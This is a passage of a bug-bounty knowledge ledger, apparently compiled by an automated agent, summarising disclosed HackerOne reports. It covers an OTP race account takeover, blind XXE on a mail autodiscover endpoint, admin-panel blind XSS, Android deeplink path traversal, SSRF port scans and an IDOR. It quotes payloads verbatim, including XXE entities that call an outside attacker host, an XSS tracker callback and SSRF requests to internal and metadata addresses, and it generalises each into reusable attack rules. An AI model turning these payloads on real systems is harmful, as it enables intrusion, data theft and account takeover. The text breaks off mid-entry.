CLASS: race condition / TOCTOU in an E-MAIL-CHANGE flow — two CONCURRENT change requests carrying DIFFERENT addresses are served by ONE OTP generation, so the same code is delivered to both the victim's and the attacker's mailbox, and the attacker enters it on the victim's confirmation page (CWE-362 / CWE-367; ATO).
CORE METHOD:
  1. Create an account with an attacker address (`sijojohnson+attacker@wearehackerone.com`) and verify it.
  2. In account settings, change the e-mail to a second attacker address (`…+attacker2@…`) and capture the request in Burp.
  3. Send the captured request to TWO Repeater tabs; modify Request 1's e-mail to the VICTIM's address (`…+victim@…`) and leave Request 2 as the attacker's address (`…+attacker2@…`).
  4. Group both and "Send Group in Parallel".
  5. Observe: "both the victim's and attacker's email addresses will receive the same OTP".
  6. Open the confirmation page, enter the OTP, capture the request, replace the e-mail with the victim's, and send -> "The victim's email address is now successfully verified."
DETECTION SIGNAL: an e-mail-change / verification flow whose OTP is generated ONCE per burst rather than per request; two concurrent change requests with DIFFERENT target addresses; a confirmation/verify call that accepts the OTP and the e-mail address as SEPARATE parameters (so the OTP from one request is replayed against another address); a mailbox receiving the same code twice.
CHAIN: an authenticated attacker (primitive: an ordinary account) -> two concurrent change requests, one naming the victim's address (primitive: the address is a client parameter) -> the flow generates ONE OTP and delivers it to BOTH addresses (escalation: the attacker holds a code the victim's account will accept) -> the attacker submits that OTP on the victim's confirmation page (escalation: the victim's e-mail is verified to the attacker's account) -> the attacker controls the account's e-mail = account takeover (impact: data theft, unauthorized transactions, linked-account abuse; the report's own impact section). Per doctrine §8: preconditions = an authenticated session on a target that e-mail-verifies a changed address with an OTP, and the ability to send two concurrent change requests; gain = the victim's e-mail verified on the attacker's account = ATO.
TRANSFERABLE TEST: on any e-mail-change / phone-change / verification flow that sends a code, capture the change request, then send TWO concurrent copies with DIFFERENT target addresses (one yours, one a test-victim address) via a Repeater tab group / Turbo Intruder / HTTP/2 overlap; (1) check whether BOTH mailboxes receive the SAME code; (2) if so, replay that code on the victim's confirmation/verify endpoint with the victim's address; (3) confirm the victim's address is now verified. Rule: **a verification code that is generated per BURST rather than per REQUEST is shared across concurrent change requests — send two concurrent changes with different addresses, and if both mailboxes get the same code, the code from your request verifies the victim's address.**
DEDUPE: 0 hits for `3020733`, `malwarebytes`, `my.malwarebytes`, `same OTP`, `Send Group in Parallel`, `concurrent.*email`, `email.*change.*race`. Pre-existing race material REVIEWED as related-but-distinct: V-03 / the playbook's distributed-race-condition method (concurrent IDENTICAL requests passing a single-use/limit check — here the two requests carry DIFFERENT parameters and share a generated SECRET, not a counter), the ledger's "parallel-request 403 bypass" (Facebook — concurrent requests bypass a 403, a different primitive), #990048 / §17.196 (the victim's OTP delivered to BOTH handsets via an SMS gateway that accepts a multi-recipient string — a recipient-list INJECTION, not a race), #4616/#4617 (an OTP flow whose resource id is re-submitted at verify — an IDOR, not a race). No §17 slot (the race class is owned by V-03; this is the different-parameter/shared-secret variant).

SOURCE: https://hackerone.com/reports/315837  2026-11-10
ROUTE: live `.json` -> HTTP 404; the live page -> HTTP 302 -> `/users/sign_in`; the browser tool -> Cloudflare "Just a moment..."; `r.jina.ai` -> 401 IP-reputation; `curl` to `web.archive.org` -> 429 bot-block, and the browser-rendered Wayback captures are the JS SPA shell (no body). The report is NOT publicly readable (no `.json` capture exists; the CDX index shows only SPA-shell HTML captures). The technique is carried by the PUBLIC WRITEUP that reproduces the report — `evanluke.gitbook.io/appsec/xxe/xml-external-entity-xxe/xxe-examples`, section "Mail.ru (2)", which links exactly this report URL and reproduces its payload and the attacker-server log; read IN FULL this pass via `web_extract` (54,680-char page).
STATUS: UNVERIFIED (not reproduced — no mail server was touched this pass; the payload and the callback log are verbatim from the public writeup; the primary HackerOne body is unpublished).
CLASS: blind / out-of-band XXE in an E-MAIL AUTODISCOVER XML parser — an unauthenticated `POST` of an autodiscover XML document makes the backend resolve an external entity, fetch an attacker-hosted DTD over HTTP, and use the XXE SSRF as a FILE-EXISTENCE ORACLE (CWE-611; internal file read / SSRF).
CORE METHOD (per the public writeup):
  1. THE ENTRY POINT: the autodiscover XML endpoint (the writeup's callback log shows the Mail.ru backend requesting `GET /autodiscover/autodiscover.xml HTTP/1.0` — the standard Exchange autodiscover document, `http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006`).
  2. THE OUTER DOCUMENT, verbatim:
     `<?xml version="1.0" encoding="utf-8" ?> <!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY localfile SYSTEM "file:///sys/power/image_size"> <!ENTITY remotedoc SYSTEM "http://obmhld.com/pocs/?token=xmlsdfgdg5454g54&doc1=2"> ]> <foo>&localfile;&remotedoc;</foo> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006"> … </Autodiscover>`
  3. THE CALLBACK, verbatim from the attacker's log: `5.61.237.44 - - [14/Feb/2018:01:05:14 +0000] "GET /autodiscover/autodiscover.xml HTTP/1.0" 200 955 "http://obmhld.com/autodiscover/autodiscover.xml" "Mozilla/4.0 (compatible; MSIE 7.0; … Microsoft Outlook 15.0.4481; ms-office; MSOffice 15)"` followed by `5.61.237.44 - - [14/Feb/2018:01:05:15 +0000] "GET /pocs/?token=xmlsdfgdg5454g54&doc1=2 HTTP/1.0" 200 10 "-" "-"` — i.e. the backend fetches the attacker's DTD (disguised as an autodiscover document, requested with an Outlook user-agent) and then the exfil URL.
  4. THE ORACLE, verbatim: "Another XXE on Mail.ru domain where the researcher illustrated blind XXE with the ability to detect files on the server by the success of the XXE SSRF reaching out to the attacker controlled server (no XXE SSRF occurs if the file does not exist)."
DETECTION SIGNAL: an unauthenticated XML endpoint under a mail/autodiscover namespace (`/autodiscover/autodiscover.xml`, `/Autodiscover/Autodiscover.xml`, `/autodiscover/autodiscover.json`, `/EWS/…`, `/owa/…`) that parses a request-body XML document; an outbound HTTP request to your listener carrying an Outlook/MSOffice user-agent and a `.xml` path (the parser fetching a DTD); a callback that FIRES for a known-existing file (`file:///sys/power/image_size`, `/etc/passwd`, `/etc/hostname`) and does NOT fire for a non-existent one — the file-existence oracle.
CHAIN: any unauthenticated attacker on the internet (primitive: the autodiscover endpoint is unauthenticated by design) -> submit an autodiscover XML document whose DOCTYPE declares a local-file entity and a remote-DTD entity (primitive: external entities are resolved by the parser) -> the backend fetches the attacker's DTD and dereferences the file entity (escalation: server-side file read + outbound SSRF) -> the file's presence/absence is observable by whether the callback fires (escalation: a file-existence oracle) -> read sensitive files / fingerprint the host (impact: internal file read / SSRF-class XXE on the mail backend). Per doctrine §8: preconditions = reachability of the autodiscover XML endpoint with no auth and no user interaction; gain = file existence + file content read via the OOB channel.
TRANSFERABLE TEST: for every mail/autodiscover/EWS endpoint, POST an autodiscover-shaped XML document with a DOCTYPE declaring `<!ENTITY localfile SYSTEM "file:///etc/passwd">` and `<!ENTITY remotedoc SYSTEM "http://<you>/autodiscover/autodiscover.xml">`, reference both entities in the body, and serve a DTD at your URL that nests a parameter entity reading the file into a second callback (`http://<you>/pocs/?token=…&doc1=2`); watch your HTTP log for the backend's fetch of the DTD and the exfil request, and diff the callback firing for a real file vs a bogus one to confirm the file-existence oracle. Rule: **the autodiscover XML endpoint is an unauthenticated XML parser — submit an autodiscover document whose DOCTYPE pulls an attacker DTD and a local file, and use the SSRF callback as a file-existence oracle.**
DEDUPE: 0 hits for `315837`, `webmaster.mail.ru`, `autodiscover.*XXE`, `XXE.*autodiscover`, `obmhld.com`, `file existence` (as an XXE oracle). Pre-existing material REVIEWED as related-but-distinct: §17.204 / #334488 (the Open-Xchange OOXML blind XXE — a `.pptx` PACKAGE PART parsed by a document converter, with an FTP-exfil DTD; a DIFFERENT surface from a plain unauthenticated autodiscover XML POST, though the two-stage DTD method is the same), the ledger's #347139 / §17.295 (an SVG rasterizer's XInclude/entity SSRF — an image converter, not an XML endpoint), §17.229 / Mailcow (the SAME `Autodiscover/Autodiscover.xml` endpoint used as an unauthenticated STORED-XSS sink into an admin log — a different class on the same entry point, not XXE). The class is owned by §17.204; this is the SURFACE delta (a mail-autodiscover XML parser) — recorded as an entry, no new §17 slot.

NOTE — reader pass 2026-11-10 (batch 121: 6 assigned sources read ONE BY ONE in the given order; 4 entries appended to the harvest ledger, 2 §17 slots). NEW: #314814 (Semrush — the OAuth SUCCESS page `oauth.semrush.com/oauth2/success` posts its own URL, which carries the authorization `code`, to `window.opener` with `targetOrigin '*'`, so any attacker page that opens the authorize URL in a popup reads the code and exchanges it at `/oauth2/access_token` for the victim's access + refresh tokens; High 7.4, full body read on the live `.json` route -> §17.361), #235139 (Zendesk — the "Ticket Trick": a support desk that registers an UNVERIFIED address creates a readable ticket for it, so registering the company's own role address (`support@`/`feedback@`/`no-reply@`) lets the attacker read the mailbox's inbound mail and harvest the third-party magic verification links / password resets -> join Slack/Yammer/Twitter and hijack privileged accounts; the report is `no-content`, so the technique is carried by the researcher's credited Medium writeup read in full via the Wayback capture -> §17.362), #3020733 (Malwarebytes — two CONCURRENT e-mail-change requests carrying DIFFERENT addresses are served by ONE OTP generation, so the same code reaches both mailboxes and the attacker's code verifies the victim's address; full body read on the live `.json` route; race-class carrier delta of V-03, no §17 slot), #315837 (Mail.ru — blind/out-of-band XXE in the unauthenticated autodiscover XML parser, using the XXE SSRF as a FILE-EXISTENCE ORACLE; the primary report is unpublished on every route, so the technique is carried by the public writeup `evanluke.gitbook.io/appsec/…/xxe-examples` section "Mail.ru (2)"; class owned by §17.204, this is the SURFACE delta, no §17 slot). DUPLICATE (valid, read, nothing new): #159498 (LocalTapiola — an SVG uploaded as a `.txt` message attachment is rendered as SVG by the browser's content sniffing when the employee opens it -> stored XSS with session-cookie theft; the MIME-sniffing class is owned by the playbook's V-17 and the SVG-upload XSS carrier by §1.4 / §17.96 — the report ID is new but the method is not), #3426839 (AWS VDP — a coupon code published in a public disclosure is reusable with no server-side usage validation -> unlimited free shipping; the coupon/one-time-benefit class is owned by V-09 and the ledger's one-time-benefit entry — the report ID is new but the method is not). 0 fabricated. Knowledge intake only — no target was touched; the only network traffic was `curl`/`web_extract`/`web_search`/the browser tool against `hackerone.com` report routes, the Wayback availability+`.json`+page endpoints, `r.jina.ai`, the ajaysenr mirror, the credited Medium writeup, and the public XXE writeup.

SOURCE: https://hackerone.com/reports/666040  2026-11-10
ROUTE: live `.json` -> HTTP 200, `visibility: no-content`, `vulnerability_information` 0 B; the live page in the browser tool -> "Sorry, something went wrong. Please contact us at https://support.hackerone.com"; `https://r.jina.ai/<url>` -> HTTP 200, renders ONLY the vendor "Summary by Acronis" + the timeline; the Wayback capture `web.archive.org/web/20260208172251/...` (4,930 B) -> the JS-disabled SPA shell ("It looks like your JavaScript is disabled"); the local disclosed-reports mirror `/tmp/h1_train.parquet` has NO row for 666040; no credited public writeup exists (a web search surfaced only the bugbountyhunter.com metadata entry). The technique is carried by the VENDOR SUMMARY alone.
STATUS: UNVERIFIED (not reproduced — no Acronis account or admin panel was touched this pass; the carrier is the vendor's own published summary; no field name, payload or request shape is public).
CLASS: stored/blind XSS — a payload submitted in a USER-PORTAL account-lifecycle form (the account-deletion process on account.acronis.com) is persisted and rendered in the ADMIN panel (admin.acronis.com), so it executes in an administrator's browser (CWE-79; blind stored XSS -> admin-session compromise).
CORE METHOD (per the vendor summary):
  1. The user portal (account.acronis.com) has an account-deletion flow; the vendor's own public docs describe a deletion wizard with a reason step and an optional additional comment.
  2. Submit a blind-XSS payload in a field of that deletion form (the report does not name the field).
  3. The value is stored and later rendered in the admin panel (admin.acronis.com) without sanitisation.
  4. An administrator who opens the deletion record runs the payload in the admin origin.
DETECTION SIGNAL: a user-facing account-lifecycle form (deletion/closure/cancellation/feedback) whose submitted values are displayed in an admin panel; a cross-subdomain pair (user portal vs admin portal) where the admin renders user-submitted free text; a blind-XSS tracker callback firing from an admin-session IP/UA; a report titled "blind XSS on <admin> via <user-portal> form".
CHAIN: any authenticated user (primitive: an ordinary account) -> submit a blind-XSS payload in the account-deletion form on the user portal (primitive: the form stores free text and the value is not sanitised) -> an administrator opens the deletion record in admin.acronis.com (escalation: the payload executes in the ADMIN origin, with the admin's session) -> admin-session/CSRF actions (impact: admin-panel compromise; the program rated the report High). Per doctrine §8: preconditions = an account-deletion (or other lifecycle) form on a user portal whose values render in an admin panel, and an administrator who opens the record; gain = script execution in the admin origin = admin-session compromise.
TRANSFERABLE TEST: for every account-lifecycle form on a user portal (delete/close/cancel account, feedback, reason-for-leaving, support-ticket subject), submit a blind-XSS payload (`<img src=http://<you>/x?d=deletion>` or a tracker script) in EVERY free-text field, then check (a) whether the value is stored and rendered in the corresponding admin panel, and (b) whether your tracker receives a callback from an admin-session IP/UA. Rule: **a user-portal lifecycle form whose values are rendered in an admin panel is a blind-stored-XSS carrier — plant a tracker in every field of the deletion/closure form and watch for an admin-origin callback.**
DEDUPE: 0 hits for `666040`, `admin.acronis.com`, `account deletion` (as an XSS carrier), `delete account form`. Pre-existing material REVIEWED as related-but-distinct: V-05 / the playbook's blind-XSS method (fires in an admin panel — the CLASS owner), the ledger's admin-panel stored-XSS entries (#948929 staff name, #127948 activity log, #1283938 branding field, #3447021 admin notice) — all are ADMIN-side or admin-form carriers; NONE records a USER-portal account-deletion form as the injection point. The §17.352 entry (#979204) is a DIFFERENT Acronis report (DOM XSS on the partners.acronis.com login page via JS unicode escapes). Carrier delta — no new §17 slot.

SOURCE: https://hackerone.com/reports/2553411  2026-11-10
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` 1,168 B read IN FULL (the package details, the summary, the deeplink PoC and the impact). Metadata: Basecamp, "Path traversal in deeplink query parameter can expose any user's private info to a public directory (one click)", Path Traversal, Medium (CVSS 5.5; AV:local/UI:R/C:H), reporter fr4via, submitted 2024-06-16, disclosed 2024-07-09, asset GOOGLE_PLAY_APP_ID com.basecamp.bc3.
STATUS: UNVERIFIED (not reproduced — no Android device or Basecamp account was used this pass; the deeplink PoC and the package details are verbatim from the report body).
CLASS: mobile path traversal / arbitrary file write — a DEEPLINK query parameter (`filename`) that the app uses as the local save path is traversed with `../` to write the user's private report into the device's SHARED storage, where any third-party app with READ/MANAGE external storage can read it (CWE-22; internal file read / data disclosure).
CORE METHOD (reporter's exact steps):
  1. The Android app `com.basecamp.bc3` (Basecamp 4.8.6, versionCode 380, minSdk 28, targetSdk 34, sha256 124861dd…) declares in its manifest that it handles deeplinks of the form `https://3.basecamp.com/*`.
  2. A report deeplink takes an additional `filename` parameter, which the app uses as the local save path: `https://3.basecamp.com/5195267/reports/progress?filename=<PATH>`.
  3. Inject a traversal path — the report's exact PoC: `https://3.basecamp.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt`.
  4. The app saves the victim's progress report to `/sdcard/Download/disclosure.txt` — a shared directory.
  5. Any third-party app with READ/MANAGE external storage reads the file.
  6. Because Basecamp renders links in comments/projects, the attacker can plant the malicious deeplink "literally anywhere" — one click.
DETECTION SIGNAL: a mobile app that handles deeplinks and takes a query parameter used as a FILE PATH or save name (`filename`, `path`, `file`, `name`, `dest`); a deeplink that triggers a DOWNLOAD/EXPORT/SAVE of a user document; a save routine that concatenates the param into a path with no `basename()`/`..` check; a write that lands in shared storage (`/sdcard`, `/storage/emulated/0`, `Downloads`, `DCIM`) rather than the app's private dir; a report/PDF/export feature reachable by a crafted URL.
CHAIN: an attacker (primitive: Basecamp renders links in comments/projects, so a malicious deeplink can be planted anywhere) -> the victim clicks the deeplink (primitive: one click; the link is on the app's own domain `3.basecamp.com`, so it is a legit deep link) -> the app saves the victim's private report to the traversed path in shared storage (escalation: arbitrary file write outside the app's sandbox) -> any malicious app with READ/MANAGE external storage reads the file (escalation: cross-app private-data disclosure) -> the victim's private info is exposed to third parties (impact: sensitive info disclosure with PoC; program rated Medium 5.5, C:H). Per doctrine §8: preconditions = the app handles a deeplink whose `filename`-style param is used as the save path, and the victim clicks a planted link; gain = the victim's private report written to a world-readable location = data disclosure.
TRANSFERABLE TEST: for every mobile app in scope that handles deeplinks/deep-links, enumerate the query parameters of every deeplink that triggers a download/export/save/preview, and inject a traversal path into each path-shaped param (`?filename=/../../../../../../sdcard/Download/x`, `?path=..%2f..%2f..%2fsdcard%2fDownload%2fx`, `?file=....//....//sdcard/...`); click the crafted link (or fire the intent with `adb shell am start -n <pkg>/<activity> '<deeplink>'`) and check (a) whether the file appears OUTSIDE the app's private directory (e.g. in `/sdcard/Download`), and (b) whether a second app with storage permission can read it. Rule: **a mobile deeplink parameter that names the file the app writes is a path-traversal sink — inject `../` and aim at shared storage so any app can read what the victim saved.**
DEDUPE: 0 hits for `2553411`, `com.basecamp.bc3`, `filename` (as a deeplink save path), `sdcard`, `shared storage`, `disclosure.txt`. Pre-existing material REVIEWED as related-but-distinct: §17.74 / #2995025 (a desktop localhost inspector's `live_reload` naive `dir + fileName()` concat — a dev-websocket carrier, not a deeplink), §17.88 (a client tool deriving a local filename from page-controlled attributes — a desktop temp-dir carrier), the ledger's #1378889 / Slack Android (a SERVER-supplied upload filename written into the app's OWN PRIVATE config/prefs storage -> auth-token disclosure — a different carrier and a different sink), §17.343 (Facebook Messenger for Windows filename traversal -> RCE — a desktop autostart sink), the ledger's #1372667 / Basecamp (a deep link `?proceed_to=` allowlist bypass -> bearer-token theft — a different deeplink param and a different class). New general method -> §17.363.

SOURCE: https://hackerone.com/reports/1875484  2026-11-10
ROUTE: live `.json` -> HTTP 200, `visibility: no-content`, `vulnerability_information` 0 B; the live page in the browser tool -> "Sorry, something went wrong"; `https://r.jina.ai/<url>` -> HTTP 200, renders ONLY the vendor "Summary by 8x8" + the timeline; the Wayback capture `web.archive.org/web/20230530194236/...` (3,752 B) -> the JS-disabled SPA shell; the local disclosed-reports mirror `/tmp/h1_train.parquet` HAS a row for 1875484 but `vulnerability_information` is empty (0 B). The technique is carried by the VENDOR SUMMARY alone.
STATUS: UNVERIFIED (not reproduced — no 8x8 Connect account or internal network was touched this pass; the endpoint and the request shape are verbatim from the vendor summary).
CLASS: blind SSRF — a chat image-check endpoint fetches an attacker-controlled URL server-side; the response is not returned, so the SSRF is detected by timing/error differences and used to port-scan internal hosts (CWE-918).
CORE METHOD (per the vendor summary):
  1. The endpoint: `POST /api/v2/chats/image-check` on `connect.8x8.com` (the 8x8 Connect ChatApps module).
  2. The request, verbatim: `Content-Type: application/json`, `Content-Length: 41`, body `{"url":"http://127.0.0.1:/?a=a.png"}`.
  3. The endpoint fetches the `url` value server-side; the response is blind (no body returned to the caller).
  4. The SSRF is used to scan internal ports (the report title: "allows for Internal Ports scan").
  5. The vendor retired the entire API path as the fix.
DETECTION SIGNAL: a chat/messaging/image endpoint that takes a URL parameter (`url`, `image`, `src`, `image_url`, `preview_url`) and fetches it server-side (an "image-check", "image proxy", "link preview", "unfurl", "avatar fetch"); a response whose length/timing differs for an open vs closed internal port; a blind SSRF with no readback; a report titled "blind SSRF ... internal port scan".
CHAIN: an authenticated chat user (primitive: the ChatApps/image-check endpoint is reachable from the chat UI) -> submit `{"url":"http://127.0.0.1:<port>/"}` (primitive: the `url` value is attacker-controlled and fetched server-side) -> the server fetches the internal address (escalation: outbound request from inside the target network) -> the response/timing differential reveals open/closed internal ports (escalation: internal port scan) -> internal service fingerprinting and further SSRF chains (impact: internal reach; program rated Medium). Per doctrine §8: preconditions = a URL-fetching chat/image endpoint reachable with an ordinary chat session, and no egress restriction on the fetch; gain = internal port scan / internal service reach.
TRANSFERABLE TEST: for every chat/messaging/image endpoint that takes a URL parameter, submit `{"url":"http://127.0.0.1:<port>/"}` for a range of ports (e.g. 22, 80, 443, 3306, 5432, 6379, 8080, 9200) and diff the response length/timing against a known-closed port; then try `http://169.254.169.254/latest/meta-data/`, an RFC1918 host, and `file://`/`gopher://`/`dict://` schemes. Rule: **a chat image-check / image-proxy endpoint is a URL-fetching SSRF sink — submit `{"url":"http://127.0.0.1:<port>/"}` and port-scan by timing/length differential.**
DEDUPE: 0 hits for `1875484`, `image-check`, `connect.8x8.com`, `127.0.0.1:` (as an SSRF payload), `internal port scan` (as a blind-SSRF technique). Pre-existing material REVIEWED as related-but-distinct: the ledger's Reddit #1960765 "Blind SSRF to internal services in matrix preview_link API" (blind SSRF in a URL-PREVIEW endpoint that returns `og:title` -> a read oracle + internal port scan) — the GENERAL method (submit `url=http://127.0.0.1:<port>/` to a fetch-URL endpoint and sweep ports by timing) is already recorded there; this entry is admitted only for the CARRIER (a chat image-check/image-validator endpoint, a distinct surface) and the exact payload shape. The ledger's other SSRF entries (Sentry `filename`, GitLab OAuth `Host`, Rockstar SVG rasterizer, Kubernetes, 8x8 Automation Builder deserialization §17.151) are different carriers. Carrier delta — no new §17 slot.

NOTE — reader pass 2026-11-10 (batch 122: 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger, 1 §17 slot). NEW: #2553411 (Basecamp — a mobile DEEPLINK `filename` query param used as the app's local save path is traversed with `/../../../../../../../../../../sdcard/Download/disclosure.txt`, writing the victim's private report into SHARED storage where any third-party app with READ/MANAGE external storage reads it; full body read on the live `.json` route -> §17.363), #666040 (Acronis — a payload submitted in the account-deletion form on the user portal account.acronis.com is persisted and rendered in the admin panel admin.acronis.com -> blind stored XSS in the admin origin; `no-content`, so the carrier is the vendor's one-sentence summary; carrier delta of V-05, no §17 slot), #1875484 (8x8 — `POST /api/v2/chats/image-check` with `{"url":"http://127.0.0.1:/?a=a.png"}` is a blind SSRF that port-scans internal hosts; `no-content`, so the endpoint+payload are the vendor's summary; carrier delta of the recorded Reddit preview_link blind-SSRF method, no §17 slot). DUPLICATE (valid, read, nothing new): #3104355 (Dust — a race on a COUNTED folder limit: delete one folder to drop below 10, then burst concurrent identical create requests so every request reads the stale count and passes; the race class is owned by the playbook's V-03 "concurrent identical requests pass a single-use/limit check", and the report's own impact is resource abuse, not monetary/account), #1601140 (Panther Labs — a search query parameter reflected unencoded into the page (`/search/Users<h1>...`); the search/store-locator reflected-XSS method is owned by the ledger's Starbucks #496375 entry). INVALID: #2090964 (IBM — "RXSS in hidden parameter", `visibility: no-content`, 0 B; the only public text is the vendor's one-sentence summary with NO parameter name, URL or payload — nothing concrete to record). 0 fabricated. Knowledge intake only — no target was touched; the only network traffic was `web_extract`/`curl`/`web_search`/the browser tool against `hackerone.com` report routes, the Wayback availability+CDX+page endpoints, `r.jina.ai`, and the local disclosed-reports parquet mirror.
SOURCE: https://hackerone.com/reports/1581528  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200, full body rendered IN FULL (46,055 clean chars; the reporter's summary, the numbered repro steps, the verbatim vulnerable request, the impact section and the triage timeline). The live `.json` route also answers 200. Metadata: LinkedIn, "Can access the job name, creator name and can report any draft/under review/rejected job", weakness Insecure Direct Object Reference (IDOR), severity Medium (5.3; H1 triage first set high 8.2 then 7.1 before the final 5.3), reporter `sachin_kr`, submitted 2022-05-26, disclosed 2022-07-20, state Resolved, asset www.linkedin.com.
STATUS: UNVERIFIED (not reproduced — no LinkedIn account or job-report endpoint was touched this pass; the request and every step below are verbatim from the report body).
CLASS: BAC / IDOR on a MODERATION ("report this content") write endpoint — the endpoint validates that the target object EXISTS but never that it is VISIBLE to the reporter, so an object in a non-public lifecycle state (draft / under review / rejected) can be acted on; the act then runs a privileged asynchronous review pipeline that DISCLOSES the target's creator identity and content back to the attacker (CWE-639 / CWE-863).
CORE METHOD (verbatim from the report):
  1. THE FEATURE, verbatim: "The application has a functionality using which a user can report a job if he found the job is misleading/spam or fraud. Using this feature, an attacker can do report any unlisted (draft/under review/rejected) job."
  2. THE SETUP, verbatim: "Log in to an account and go to any posted job - `https://www.linkedin.com/jobs/view/3084381086/`".
  3. THE UNLISTED OBJECT, verbatim: "Now open any (rejected/draft or under review job using the job id) - `https://www.linkedin.com/jobs/view/3086447496/`. The application will give `Something went wrong` error message." — i.e. the object is fetched by an ID in the PATH, and the PUBLIC page refuses to render it.
  4. THE WRITE, verbatim: "Report the posted job and intercept the vulnerable request."
  5. THE VULNERABLE REQUEST, verbatim in full:
     `POST /lite/flag-content?contentUrn=urn:li:jobPosting:3086455454&reason=OFFENSIVE&contentSource=JOBS_PREMIUM_OFFLINE&authorProfileId=0&trk=report-content HTTP/2`
     `Host: www.linkedin.com`
     `Cookie: XXX`
     `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0`
     `Accept: */*`
     `Accept-Language: en-US,en;q=0.5`
     `Accept-Encoding: gzip, deflate`
     `Csrf-Token: ajax:3198904967979491318`
     `X-Isajaxform: 1`
     `Origin: https://www.linkedin.com`
     `Referer: https://www.linkedin.com/jobs/view/3084381086/?refId=…&trk=d_flagship3_company`
     `Sec-Fetch-Dest: empty` / `Sec-Fetch-Mode: cors` / `Sec-Fetch-Site: same-origin`
     `Content-Length: 0` / `Te: trailers`
     Note the three attacker-controlled values: `contentUrn` (the target object id), `authorProfileId=0`, `reason`, `contentSource`.
  6. THE BYPASS, verbatim: "Forward the job using the draft, rejected jobId - 3086447496. The report will get submitted without any error." — the jobId in the QUERY of the flag request is swapped for the ID of an UNLISTED job, and the report is ACCEPTED.
  7. THE DISCLOSURE CHANNEL, verbatim: "And after some time (1hr) you will receive an email in the social tab of the email from `Linkedin Trust and Safety`. This email includes the name of the job creator and his profile link and when u click on the `View your Report` button. It will disclose the name of the job including the location." The email's own body, verbatim: "We reviewed your report. Here's what we did." The "view your report" button lands on `https://www.linkedin.com/safety/reports/:reportId`.
  8. THE IMPACT AS THE REPORTER STATES IT, verbatim: "An attacker can report any unlisted job and can access the name of the creator, name of the job name of the company, etc details."
DETECTION SIGNAL: a "report / flag / abuse" endpoint that takes the target object's IDENTIFIER as a REQUEST PARAMETER (`contentUrn`, `contentId`, `entityId`, `postId`, `listingId`, `jobId`) rather than resolving it from the page context; a state-machine object type whose NON-PUBLIC states (draft, pending, under-review, rejected, unpublished, suspended) still exist in the database and are addressable by ID; a target page that answers "Something went wrong" for an object you know exists; a report-submission response that returns success for an object the public view refuses to render; an asynchronous review/moderation pipeline that EMAILS the reporter the outcome — the notification is a read-back oracle for data the public surface hides.
CHAIN: any authenticated user (primitive: the report/flag endpoint is reachable from any posted object, and the target id is a URL parameter) -> swap `contentUrn` to the id of a DRAFT / UNDER-REVIEW / REJECTED object (primitive: the object exists and is addressable; the server checks existence, not visibility) -> the report is accepted and enters the Trust & Safety review pipeline (escalation: a state-changing write executes on an object the reporter cannot legitimately see) -> the pipeline's outcome notification is mailed to the reporter and carries the object's creator name, creator profile link, job name and location (escalation: privileged pipeline data is disclosed back to the caller) -> the attacker learns the identity and content of an unlisted posting (impact: BAC/IDOR on non-public objects + cross-user PII/identity disclosure; program rated Medium 5.3). Per doctrine §8: preconditions = any authenticated account and the numeric id of a non-public object (enumerable from the public sequence or harvested from a shared link); gain = the object's creator identity, job name, company and location, none of which the public surface discloses.
TRANSFERABLE TEST: for EVERY "report / flag / abuse / spam" endpoint, (1) capture the request on a PUBLIC object and note the parameter that carries the target id (`contentUrn`, `contentId`, `entityId`, `postId`, `listingId`); (2) obtain the id of an object in a NON-PUBLIC state — draft, pending, under review, rejected, unpublished, suspended, deleted-soft — and replay the SAME request with that id swapped in; (3) a 2xx/"submitted without any error" for an object the public view refuses to render is the bug; (4) then read the OUTCOME channel (notification e-mail, in-app "your reports" page, `safety/reports/<id>`) and diff what it discloses about the target against what the public surface shows — any creator name, profile link, content or location is the impact. Rule: **a moderation/flag endpoint validates that the target EXISTS, not that it is VISIBLE to you — swap the target id to a draft/rejected/unpublished object and the report still runs, and the review pipeline's own notification hands back the hidden object's creator and content.**
DEDUPE: 0 hits across all three write targets for `1581528`, `flag-content`, `contentUrn`, `contentSource`, `JOBS_PREMIUM_OFFLINE`, `safety/reports`, `Something went wrong` (as an IDOR signal), `unlisted job`. Pre-existing material REVIEWED as related-but-distinct: the ledger's IDOR/BOLA family is dominated by READ and object-OWNERSHIP checks (§17.167 archived-UUID read, §17.173 shared-constant ownership check, §17.363 deeplink filename traversal, and the ~50 `CLASS: IDOR/BOLA` entries above) — NONE records a WRITE/moderation endpoint whose defect is a missing VISIBILITY/state check rather than a missing ownership check, and NONE uses the REVIEW-PIPELINE NOTIFICATION as the disclosure channel. The playbook's V-01/V-05 (IDOR/BOLA) and V-06 (BFLA) likewise address reads and privilege, not "act on a non-public object through a report endpoint and get its metadata mailed back". New general method -> §17.364.

SOURCE: https://hackerone.com/reports/864783  2026-11-10
ROUTE: `web_extract` -> HTTP 403 (Keenable "Upstream forbidden"); the live `.json` route -> HTTP 404; `r.jina.ai` -> HTTP 401 (IP-reputation block); the browser tool -> Cloudflare "Just a moment..."; all three Wayback PAGE captures (20220322054027 / 20220325090459 / 20241109080507) are the JS-disabled SPA shell. ROUTE THAT WORKED: the Wayback `.json` capture `web.archive.org/web/20220322054031id_/https://hackerone.com/reports/864783.json` -> HTTP 200, 4,463 B, `visibility: no-content`, `vulnerability_information` 0 B — but the capture carries the reporter's own `summaries[1].content` (the full technique, quoted below) plus `weakness`, `severity`, `structured_scope`, the 22-item `activities` array and `participants`. Metadata as served: Glassdoor, "Get all personal email IDs of Glassdoor users[No user interaction required]", weakness Information Disclosure, severity high (author_type User), reporter `safehacker_2715`, created 2020-05-02, disclosed 2022-03-21, state Closed, asset URL `http://www.glassdoor.com/`.
STATUS: UNVERIFIED (not reproduced — no Glassdoor request was made this pass; the entry point, the parameter and the enumeration step are verbatim from the reporter's own summary field in the archived `.json`).
CLASS: unauthenticated IDOR / broken object-level authorization on a SEQUENTIAL integer object id — an endpoint that resolves an object from a request parameter returns that object's OWNER PII (the account e-mail address) to a caller with no session and no relationship to the object (CWE-639 / CWE-306).
CORE METHOD (verbatim from the reporter's own summary field, recovered from the archived `.json`):
